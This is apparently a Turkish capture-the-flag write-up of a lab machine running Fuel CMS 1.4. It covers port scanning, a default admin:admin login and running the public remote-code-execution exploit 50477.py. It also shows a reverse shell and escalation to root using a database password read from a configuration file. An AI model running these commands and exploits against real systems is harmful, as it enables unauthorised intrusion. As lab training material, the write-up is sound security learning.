Öncelikle Rustscan ile bir port taraması gerçekleştirdik.
Rustscan, Nmap'e kıyasla daha hızlı sonuç verdiği için tercih edildi. Bu tarama sonucunda elde ettiğimiz açık portları, daha detaylı bir analiz için Nmap ile yeniden taradık. Böylece, hem hızdan ödün vermemiş olduk hem de Nmap’in sunduğu derinlemesine bilgileri değerlendirme şansı yakaladık.


```bash
rustscan -a 10.10.123.74
```
```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.123.74:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 08:42 EDT
Initiating Ping Scan at 08:42
Scanning 10.10.123.74 [4 ports]
Completed Ping Scan at 08:42, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:42
Completed Parallel DNS resolution of 1 host. at 08:42, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:42
Scanning 10.10.123.74 [1 port]
Discovered open port 80/tcp on 10.10.123.74
Completed SYN Stealth Scan at 08:42, 0.19s elapsed (1 total ports)
Nmap scan report for 10.10.123.74
Host is up, received reset ttl 63 (0.33s latency).
Scanned at 2025-07-24 08:42:58 EDT for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
```

---


Rustscan çıktısına göre 80 numaralı portun açık olduğunu ve HTTP servisi çalıştığını tespit ettik.
Bu ön bilginin ardından, daha fazla detay elde edebilmek amacıyla 80 numaralı porta özel bir Nmap taraması gerçekleştirdik. Bu sayede, HTTP servisine ait versiyon bilgileri ve potansiyel açıklara dair daha kapsamlı bilgi elde etmeyi hedefledik.
```bash
nmap -Pn -sV -A 10.10.190.125 -p 80
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:16 EDT
Nmap scan report for 10.10.190.125
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.4 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (96%), Linux 3.2 - 4.14 (96%), Linux 5.4 (96%), Linux 4.15 (95%), Linux 4.15 - 5.19 (95%), Linux 3.10 - 3.13 (95%), Linux 2.6.32 - 3.10 (95%), Linux 3.10 - 4.11 (94%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   84.55 ms 10.9.0.1
2   84.64 ms 10.10.190.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds
```

---


Nmap taramasının ardından elde ettiğimiz çıktıları analiz ettiğimizde, robots.txt dosyasının mevcut olduğunu fark ettik.
Bu dosya genellikle arama motorlarına hangi sayfaların taranmaması gerektiğini bildirir; ancak bazen dizin gezintisi ya da gizlenmiş yollar hakkında ipuçları da barındırabilir. Bu nedenle ilgili web sitesini tarayıcıda ziyaret ederek robots.txt dosyasını inceledik.

<img width="825" height="694" alt="fuelcms" src="https://github.com/user-attachments/assets/332593a0-54d2-4bce-8c37-de121ce11e7c" />

<img width="602" height="471" alt="credential" src="https://github.com/user-attachments/assets/138e50f7-a454-44c6-adb9-48919f75b43a" />


---


İlk olarak, web sayfasını incelediğimizde dikkat çeken şey yazılımın versiyon bilgisiydi — sayfada “v1.4” sürümünün kullanıldığı belirtilmişti.
Bu tür versiyon bilgileri, bilinen güvenlik açıklarını araştırmak açısından önemlidir.

Sayfanın alt kısımlarına indiğimizde ise, bir parola ifadesi ile birlikte veritabanına ait olabileceğini düşündüğümüz bir dosya yoluna rastladık. Bu tür bilgiler genellikle istemeden sızdırılmış olabileceğinden, güvenlik testi kapsamında önemli ipuçları sağlar.

Tüm bu gözlemlerimizi not aldıktan sonra, daha önce fark ettiğimiz robots.txt dosyasını incelemek üzere yönlendik.

<img width="100" height="36" alt="robots txt" src="https://github.com/user-attachments/assets/dcb761a6-bcbe-49f3-a95b-2ef745ec0239" />


---


robots.txt dosyasını incelediğimizde, belirli bir dizine yönlendirme yapıldığını gördük.
Bu dizini tarayıcıda ziyaret ettiğimizde ise karşımıza bir giriş (login) paneli çıktı. Bu panelin, daha önce web sayfasında gördüğümüz parola veya veritabanı bilgileriyle bağlantılı olabileceğini düşünerek detaylı analiz yapmaya karar verdik.

<img width="715" height="601" alt="login" src="https://github.com/user-attachments/assets/98631993-a425-406e-9202-f0c61e3e65ae" />


---


Web sitesini ilk ziyaret ettiğimizde sayfanın alt kısmında gördüğümüz admin:admin kullanıcı adı ve parolasını, login panelinde deniyoruz.
Bu basit kimlik bilgileriyle giriş yapmayı denediğimizde, panel erişimini başarılı bir şekilde elde ediyoruz. Bu durum, sistemin varsayılan veya zayıf kimlik bilgileriyle korunduğunu gösteriyor ve güvenlik açısından ciddi bir zafiyeti işaret ediyor.

<img width="1686" height="838" alt="dashboard" src="https://github.com/user-attachments/assets/c9911c55-5f4f-4488-86c1-15757fd4ca73" />


---


Login paneline başarılı şekilde giriş yaptıktan sonra, daha önce tespit ettiğimiz CMS versiyonunu (v1.4) kullanarak SearchSploit aracı ile bir güvenlik açığı (exploit) araması gerçekleştirdik.
SearchSploit, Exploit-DB veritabanındaki yerel exploit’leri taramamıza olanak tanır ve kullanılan yazılımın bilinen zafiyetleri hakkında hızlıca bilgi edinmemizi sağlar.

```bash
searchsploit Fuel CMS 1.4
```

Bu komutla yaptığımız arama sonucunda, elimizdeki sürüme yönelik potansiyel bir exploit veya zafiyet bulunduğunu gördük ve detaylarını incelemek üzere ilerledik.

```bash
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                     | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                     | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                                     | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                                                    | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                           | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                               | php/webapps/48778.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

SearchSploit çıktısını incelediğimizde, CMS'nin 1.4 sürümüne ait bir RCE (Remote Code Execution) zafiyeti bulunduğunu fark ettik.
Bu exploit, hedef sistemde uzaktan komut çalıştırmamıza olanak tanıyabilecek kritik bir açıklıktı. Exploit dosyasını kendi sistemimize (local) almak için SearchSploit'in -m (mirror) parametresini kullandık:

```bash
searhcsploit -m 50477.py
```
Bu işlemle exploit dosyasının bir kopyası kendi makinemize indirildi ve üzerinde düzenleme ya da doğrudan çalıştırma işlemleri için hazır hale getirildi.


---


Exploit dosyasını localimize aldıktan sonra, Python ortamında kodu çalıştırarak RCE zafiyetini test etmeye başladık.
Bu adımda, exploit dosyasını çalıştırarak hedef sistem üzerinde komut çalıştırma imkânı sağladık ve sistem üzerinde kontrol elde etmeye yönelik ilk adımları attık.

```bash
python3 50477.py -u http://<your_machine_ip>/
```

Çalıştırma sırasında gerekli parametreleri ve hedef IP adresini exploit dosyasına ileterek komutlarımızın hedef sistemde yürütülmesini sağladık.



<img width="591" height="371" alt="nc" src="https://github.com/user-attachments/assets/85929737-e213-49d5-a7c8-d2193a300c34" />

Hedef sistem üzerinde Netcat (nc) servisinin yüklü ve çalışır durumda olduğunu tespit ettik.
Bunun üzerine, kendi makinemize geri bağlantı (reverse shell) alabilmek için uygun bir reverse shell komutu oluşturduk ve hedef sisteme gönderdik. Böylece, hedef sistemde interaktif bir kabuk (shell) açarak tam kontrol sağlamayı amaçladık.

<img width="1114" height="638" alt="revshell" src="https://github.com/user-attachments/assets/a2f5415f-4a0f-4f8c-a9b8-575e22fdfbe2" />

Oluşturduğumuz payload’ı hedef sisteme gönderiyoruz.
Bu payload, ters bağlantı (reverse shell) kurarak hedef makineden kendi sistemimize interaktif erişim sağlamamıza imkan tanıyor.

<img width="729" height="52" alt="paylaod" src="https://github.com/user-attachments/assets/c8dc7679-a033-4866-a3e0-973c088c0d09" />

Bağlantıyı almak için rlwrap ile birlikte Netcat (nc) kullanıyoruz.
rlwrap, Netcat terminalinde satır düzenleme ve geçmiş komutları kullanabilme gibi kolaylıklar sağladığı için, interaktif shell deneyimimizi daha verimli hale getiriyor.

<img width="519" height="91" alt="shell" src="https://github.com/user-attachments/assets/8b5371d7-5bde-4fe5-afd3-4e1f3ada247a" />

Reverse shell bağlantısı sağlandıktan sonra, hedef sistemde kullanıcı ana dizini olan home dizinine geçiyoruz.
Burada bulunan ilk bayrak dosyasını (flag) bulup okuyarak CTF'nin ilk amacını tamamlıyoruz.

```bash
$ cd /home
$ ls
www-data
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
6470xxxxxxxxxxxxxxx ==> :)
$ 
```

İlk bayrağı aldıktan sonra, önceden not ettiğimiz veritabanı dosyasının bulunduğu yol üzerinde inceleme yapmaya karar verdik.
Bu dosyayı okuyarak, veritabanı hakkında daha fazla bilgi edinmeyi ve sistemdeki diğer potansiyel zafiyetleri araştırmayı hedefledik.

```bash
$ cat fuel/application/config/database.php
```

```bash
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => '******', ==> :)
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
$ 

```
Veritabanı dosyasından elde ettiğimiz bilgiler sayesinde, sistemde root kullanıcısına erişim sağlamayı başardık.
Bu kritik aşama, genellikle şifreler, tokenlar veya yetki yükseltme için kullanılabilecek bilgiler içermektedir ve tam sistem kontrolü elde etmek için son adımdır.

```bash
www-data@ubuntu:/home$ su root
su root
Password: xxxxxx ==> :)

root@ubuntu:/home# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat roo
cat root.txt 
b9bbxxxxxxxxxxxxxxxx ==> :)
root@ubuntu:~# 

```
Son olarak, sistemdeki tüm bayrakları (flags) toplayarak CTF görevini başarıyla tamamladık.
Bu aşama, elde ettiğimiz erişimlerin ve yaptığımız keşiflerin doğrulanması açısından önemlidir.

---

Sonuç ve Öğrendiklerim

Bu CTF deneyimi, bana siber güvenlikte keşif, analiz ve istismar süreçlerinin nasıl adım adım ilerlediğini somut olarak gösterdi. Rustscan ile hızlı port taramasından, Nmap ile detaylı servis keşfine; web uygulaması incelemesinden zafiyet araştırmasına ve exploit kullanmaya kadar geniş bir yelpazede pratik yapma fırsatı buldum.

Özellikle, zayıf kimlik bilgileri ve bilinen açıkların nasıl sistemlere erişim sağladığını görmek, güvenlik farkındalığımı artırdı. Ayrıca, gerçek ortamda reverse shell kurma ve yetki yükseltme gibi kritik adımları uygulamak, teknik yeteneklerimi geliştirdi.

CTF'ler bana sadece teknik bilgi değil, aynı zamanda sabır, dikkatli gözlem ve sistematik düşünmenin önemini öğretti. Bu deneyim, gelecekte karşılaşacağım gerçek dünya siber güvenlik senaryoları için güçlü bir temel oluşturdu ve motivasyonumu artırdı.
